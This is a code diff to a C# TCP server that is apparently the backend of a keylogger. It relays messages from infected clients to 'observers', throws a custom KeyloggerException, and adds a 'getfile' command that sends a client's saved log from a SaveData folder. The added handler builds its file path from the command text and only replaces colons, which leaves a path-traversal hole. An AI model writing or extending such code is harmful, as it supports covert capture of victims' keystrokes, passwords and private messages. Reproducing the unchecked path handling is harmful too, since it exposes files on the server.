@@ -7,6 +7,7 @@ using System.Net;
 using System.Text;
 using System.Threading.Tasks;
 using System.Threading;
+using Common;
 
 namespace ServerCore
 {
@@ -64,7 +65,7 @@ namespace ServerCore
                 }
                 catch (Exception ex)
                 {
-                    Console.WriteLine($"Accept error: {ex.Message}");
+                    throw new KeyloggerException("Failed to accept or process incoming client.", ex);
                 }
             }
         }
@@ -97,7 +98,7 @@ namespace ServerCore
                     string message = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                     Console.WriteLine($"[{handler.Id}] {message}");
 
-                    await writer.WriteLineAsync(message);
+                    await writer.WriteAsync(message);
                     await writer.FlushAsync();
 
                     Notify("[" + handler.Id + "]" + message);
@@ -105,7 +106,7 @@ namespace ServerCore
             }
             catch (Exception ex)
             {
-                Console.WriteLine($"Error with {handler.Id}: {ex.Message}");
+                throw new KeyloggerException($"Error while handling client {handler.Id}.", ex);
             }
             finally
             {
@@ -151,11 +152,46 @@ namespace ServerCore
                                 byte[] responseData = Encoding.UTF8.GetBytes(response + "\n");
                                 await stream.WriteAsync(responseData, 0, responseData.Length);
                             }
+                            else if (command.StartsWith("getfile", StringComparison.OrdinalIgnoreCase))
+                            {
+                                string clientId = command.Substring("getfile".Length).Trim();
+                                string safeFileName = clientId.Replace(":", "_");
+                                string filePath = Path.Combine("SaveData", safeFileName + ".txt");
+                                try
+                                {
+                                    if (File.Exists(filePath))
+                                    {
+                                        string fileContent;
+
+                                        using (var fs = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
+                                        using (var sr = new StreamReader(fs))
+                                        {
+                                            fileContent = await sr.ReadToEndAsync();
+                                        }
+                                        byte[] response = Encoding.UTF8.GetBytes("[FILE]" + fileContent);
+                                        await stream.WriteAsync(response, 0, response.Length);
+                                    }
+                                    else
+                                    {
+                                        string errorMsg = "[ERROR]File not found";
+                                        byte[] response = Encoding.UTF8.GetBytes(errorMsg);
+                                        await stream.WriteAsync(response, 0, response.Length);
+                                    }
+                                }
+                                catch (Exception ex)
+                                {
+                                    Console.WriteLine($"Error reading or sending file: {ex.Message}");                             
+                                }
+                            }
                         }
 
                         await Task.Delay(100); // Small delay to prevent CPU spin
                     }
                 }
+            }
+            catch (Exception ex)
+            {
+                throw new KeyloggerException($"Error while keeping observer {observer.Id} alive.", ex);
             }
             finally
             {
